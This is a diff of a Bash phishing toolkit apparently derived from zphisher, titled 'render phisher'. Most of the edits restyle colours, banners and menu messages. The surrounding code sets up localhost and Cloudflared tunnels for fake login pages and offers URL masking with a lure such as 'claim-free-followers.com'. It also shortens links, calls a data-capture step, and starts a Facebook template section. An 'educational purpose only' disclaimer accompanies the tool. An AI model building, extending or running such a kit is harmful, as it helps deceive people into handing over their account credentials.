@@ -10,7 +10,7 @@ PORT='8080'
 # Standard Colors
 BLACK="$(printf '\033[30m')"   RED="$(printf '\033[31m')"     GREEN="$(printf '\033[32m')"  
 YELLOW="$(printf '\033[33m')"  BLUE="$(printf '\033[34m')"    MAGENTA="$(printf '\033[35m')"  
-CYAN="$(printf '\033[36m')"    WHITE="$(printf '\033[37m')"
+CYAN="$(printf '\033[36m')"    WHITE="$(printf '\033[37m')"   ORANGE="$(printf '\033[38;5;208m')"
 
 # Bright Colors
 BRIGHT_BLACK="$(printf '\033[90m')"   BRIGHT_RED="$(printf '\033[91m')"    
@@ -60,7 +60,7 @@ ${CYAN}| '__/ _ \ '_ \ / _\` |/ _ \ '__| | '_ \| '_ \| / __| '_ \ / _ \ '__|
 ${CYAN}| | |  __/ | | | (_| |  __/ |    | |_) | | | | \__ \ | | |  __/ |     
 ${CYAN}|_|  \___|_| |_|\__,_|\___|_|    | .__/|_| |_|_|___/_| |_|\___|_|     
 ${CYAN}                                 | |                                  
-${ORANGE}   Tool created by Render        |_|   ${RED}Version: ${__version__} 
+${CYAN}     ${RED}Tool created by Render${CYAN}      |_|       ${RED}Version: ${__version__} 
 
 EOF
 }
@@ -72,9 +72,8 @@ banner_small() {
 		${BLUE}
 		${BLUE}░█▀▄░█▀▀░█▀█░█▀▄░█▀▀░█▀▄░░░█▀█░█░█░▀█▀░█▀▀░█░█░█▀▀░█▀▄
 		${BLUE}░█▀▄░█▀▀░█░█░█░█░█▀▀░█▀▄░░░█▀▀░█▀█░░█░░▀▀█░█▀█░█▀▀░█▀▄
-		${BLUE}░▀░▀░▀▀▀░▀░▀░▀▀░░▀▀▀░▀░▀░░░▀░░░▀░▀░▀▀▀░▀▀▀░▀░▀░▀▀▀░▀░▀${WHITE} ${__version__}
-		${BLUE}
-		${BLUE}
+		${BLUE}░▀░▀░▀▀▀░▀░▀░▀▀░░▀▀▀░▀░▀░░░▀░░░▀░▀░▀▀▀░▀▀▀░▀░▀░▀▀▀░▀░▀
+		${BLUE}					${RED}Version ${__version__}
 	EOF
 }
 
@@ -204,34 +203,34 @@ check_update() {
 
 ## Check Internet Status
 check_status() {
-	echo -ne "\n${ORANGE}[${BLUE}+${ORANGE}]${CYAN} Internet Status: "
+	echo -ne "\n${CYAN} Internet Status: "
 	timeout 3s curl -fIs "https://api.github.com" > /dev/null
 	[ $? -eq 0 ] && echo -e "${GREEN}Online${WHITE}" && check_update || echo -e "${RED}Offline${WHITE}"
 }
 
 ## Dependencies
 dependencies() {
-	echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing required packages..."
+	echo -e "\n${CYAN}Installing required packages..."
 
 	if [[ -d "/data/data/com.termux/files/home" ]]; then
 		if [[ ! $(command -v proot) ]]; then
-			echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing package: ${ORANGE}proot${CYAN}"${WHITE}
+			echo -e "\n${CYAN} Installing package: ${ORANGE}proot${CYAN}"${WHITE}
 			pkg install proot resolv-conf -y
 		fi
 
 		if [[ ! $(command -v tput) ]]; then
-			echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing package: ${ORANGE}ncurses-utils${CYAN}"${WHITE}
+			echo -e "\n${CYAN} Installing package: ${ORANGE}ncurses-utils${CYAN}"${WHITE}
 			pkg install ncurses-utils -y
 		fi
 	fi
 
 	if [[ $(command -v php) && $(command -v curl) && $(command -v unzip) ]]; then
-		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Packages already installed."
+		echo -e "\n${GREEN} Packages already installed."
 	else
 		pkgs=(php curl unzip)
 		for pkg in "${pkgs[@]}"; do
 			type -p "$pkg" &>/dev/null || {
-				echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing package: ${ORANGE}$pkg${CYAN}"${WHITE}
+				echo -e "\n${CYAN} Installing package: ${ORANGE}$pkg${CYAN}"${WHITE}
 				if [[ $(command -v pkg) ]]; then
 					pkg install "$pkg" -y
 				elif [[ $(command -v apt) ]]; then
@@ -245,7 +244,7 @@ dependencies() {
 				elif [[ $(command -v yum) ]]; then
 					sudo yum -y install "$pkg"
 				else
-					echo -e "\n${RED}[${WHITE}!${RED}]${RED} Unsupported package manager, Install packages manually."
+					echo -e "\n${RED} Unsupported package manager, Install packages manually."
 					{ reset_color; exit 1; }
 				fi
 			}
@@ -277,7 +276,7 @@ download() {
 		chmod +x .server/$output > /dev/null 2>&1
 		rm -rf "$file"
 	else
-		echo -e "\n${RED}[${WHITE}!${RED}]${RED} Error occured while downloading ${output}."
+		echo -e "\n${RED} Error occured while downloading ${output}."
 		{ reset_color; exit 1; }
 	fi
 }
@@ -285,9 +284,9 @@ download() {
 ## Install Cloudflared
 install_cloudflared() {
 	if [[ -e ".server/cloudflared" ]]; then
-		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Cloudflared already installed."
+		echo -e "\n${GREEN} Cloudflared already installed."
 	else
-		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing Cloudflared..."${WHITE}
+		echo -e "\n${CYAN} Installing Cloudflared..."${WHITE}
 		arch=`uname -m`
 		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
 			download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm' 'cloudflared'
@@ -304,9 +303,9 @@ install_cloudflared() {
 ## Install LocalXpose
 install_localxpose() {
 	if [[ -e ".server/loclx" ]]; then
-		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} LocalXpose already installed."
+		echo -e "\n${GREEN} LocalXpose already installed."
 	else
-		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing LocalXpose..."${WHITE}
+		echo -e "\n${CYAN} Installing LocalXpose..."${WHITE}
 		arch=`uname -m`
 		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
 			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-arm.zip' 'loclx'
@@ -331,18 +330,23 @@ msg_exit() {
 about() {
 	{ clear; banner; echo; }
 	cat <<- EOF
-		${WHITE} Author: render437
-		${WHITE} Github: https://github.com/render437
-		${WHITE} Version: ${__version__}
+		${BRIGHT_GREEN} Author:   ${BRIGHT_BLUE}render437
+		${BRIGHT_GREEN} Github:   ${BRIGHT_BLUE}https://github.com/render437
+		${BRIGHT_GREEN} Version:  ${BRIGHT_BLUE}${__version__}
 
-		${RED} Warning:${RESET}
-		${ORANGEBG}{BLACK}This tool is made for educational purposes only. 
-		The author will not be responsible for any misuse of this tool!${RESETBG}\n"
+		${RED}Warning:
+		${BLACK} ${REDBG}This Tool is made for educational purpose only!${RESETBG}
+		${BLACK} ${REDBG}Author will not be responsible for any misuse of this toolkit!${RESETBG}
+		
+		${ORANGE}Contributors:
+		${BRIGHT_GREEN} xroche, Aditya Shakya, htr-tech,
+		${BRIGHT_GREEN} Ali Milani, KasRoudra, TripleHat, Mr.Derek
 
-		${WHITE}00. Main Menu     ${WHITE}99. Exit
+		${BRIGHT_MAGENTA}0. Main Menu     ${BRIGHT_MAGENTA}99. Exit
+
 	EOF
 
-	read -p "\n${WHITE}Select an option:"
+	read -p "${WHITE}Select an option:"
 	case $REPLY in 
 		99)
 			msg_exit;;
@@ -500,10 +504,10 @@ start_loclx() {
 ## Start localhost
 start_localhost() {
 	cusport
-	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
+	echo -e "\n${BRIGHT_GREEN} Initializing... ${BRIGHT_GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
 	setup_site
 	{ sleep 1; clear; banner_small; }
-	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Successfully Hosted at: ${GREEN}${CYAN}http://$HOST:$PORT ${GREEN}"
+	echo -e "\n${BRIGHT_GREEN} Successfully Hosted at: ${BRIGHT_GREEN}${CYAN}http://$HOST:$PORT ${GREEN}"
 	capture_data
 }
 
@@ -511,18 +515,16 @@ start_localhost() {
 tunnel_menu() {
 	{ clear; banner_small; }
 	cat <<- EOF
-
 		${WHITE} 0. Main Menu
 		${WHITE} 1. Localhost
 		${WHITE} 2. Cloudflared
-
 	EOF
 
 	read -p "${WHITE} Select a port forwarding service or return to main menu:"
 
 	case $REPLY in 
 		0 | 00)
-			echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Returning to main menu..."
+			echo -ne "\n${CYAN} Returning to main menu..."
 			{ sleep 1; main_menu; };;
 		1 | 01)
 			start_localhost;;
@@ -537,17 +539,17 @@ tunnel_menu() {
 ## Custom Mask URL
 custom_mask() {
 	{ sleep .5; clear; banner_small; echo; }
-	read -n1 -p "${RED}[${WHITE}?${RED}]${ORANGE} Do you want to Mask the URL? ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}] :${ORANGE} " mask_op
+	read -n1 -p "${ORANGE} Do you want to Mask the URL? ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}] :${ORANGE} " mask_op
 	echo
 	if [[ ${mask_op,,} == "y" ]]; then
-		echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Enter your custom URL below ${CYAN}(${ORANGE}Example: https://claim-free-followers.com${CYAN})\n"
+		echo -e "\n${GREEN} Enter your custom URL below ${CYAN}(${ORANGE}Example: https://claim-free-followers.com${CYAN})\n"
 		read -e -p "${WHITE} ==> ${ORANGE}" -i "https://" mask_url # initial text requires Bash 4+
 		if [[ ${mask_url//:*} =~ ^([h][t][t][p][s]?)$ || ${mask_url::3} == "www" ]] && [[ ${mask_url#http*//} =~ ^[^,~!@%:\=\#\;\^\*\"\'\|\?+\<\>\(\{\)\}\\/]+$ ]]; then
 			mask=$mask_url
-			echo -e "\n${RED}[${WHITE}-${RED}]${CYAN} Using custom Masked Url:${GREEN} $mask"
+			echo -e "\n${CYAN} Using custom Masked Url:${GREEN} $mask"
 		else
-			echo -e "\n${RED}[${WHITE}!${RED}]${ORANGE} Invalid url type..."
-			echo -e "\n${RED}[${WHITE}!${RED}]${ORANGE} Using the defualt url instead..."
+			echo -e "\n${ORANGE} Invalid url type..."
+			echo -e "\n${ORANGE} Using the defualt url instead..."
 		fi
 	fi
 }
@@ -590,9 +592,9 @@ custom_url() {
 		processed_url="Unable to Shorten URL"
 	fi
 
-	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 1 : ${GREEN}$url"
-	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 2 : ${ORANGE}$processed_url"
-	[[ $processed_url != *"Unable"* ]] && echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 3 : ${ORANGE}$masked_url"
+	echo -e "\n${BLUE} URL 1 : ${GREEN}$url"
+	echo -e "\n${BLUE} URL 2 : ${ORANGE}$processed_url"
+	[[ $processed_url != *"Unable"* ]] && echo -e "\n${BLUE} URL 3 : ${ORANGE}$masked_url"
 }
 
 ## Facebook
